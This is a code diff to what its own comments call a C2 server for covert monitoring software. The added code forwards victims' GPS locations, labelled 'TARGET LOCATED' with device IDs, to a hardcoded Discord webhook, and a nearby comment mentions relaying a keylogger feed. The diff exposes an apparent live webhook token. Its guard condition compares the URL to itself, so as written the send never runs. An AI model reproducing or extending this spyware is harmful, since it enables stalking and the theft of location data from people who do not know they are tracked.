@@ -82,9 +82,28 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Relay location data back to admins
-    socket.on('location_update', (data) => {
+    // Relay location data back to admins and Discord Webhook
+    socket.on('location_update', async (data) => {
         io.to('admins').emit('location_result', data);
+        
+        // Push payload to Discord Webhook
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493921945765281804/OobgGgkPuLvpaC5uhMXl0KaBwcl6MtpKQhxsn7T7-q5iu031lnAQUmuVaqqLFvCKJeJ8"; 
+        if (DISCORD_WEBHOOK_URL !== "https://discord.com/api/webhooks/1493921945765281804/OobgGgkPuLvpaC5uhMXl0KaBwcl6MtpKQhxsn7T7-q5iu031lnAQUmuVaqqLFvCKJeJ8" && !data.error) {
+            try {
+                // Find device ID for context
+                const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
+                
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**TARGET LOCATED:** ${subId}\n**GPS Map Link:** ${data.mapUrl}`
+                    })
+                });
+            } catch (err) {
+                console.error("[C2] Failed to post GPS to Discord:", err.message);
+            }
+        }
     });
 
     // Relay keylogger feed back to admins
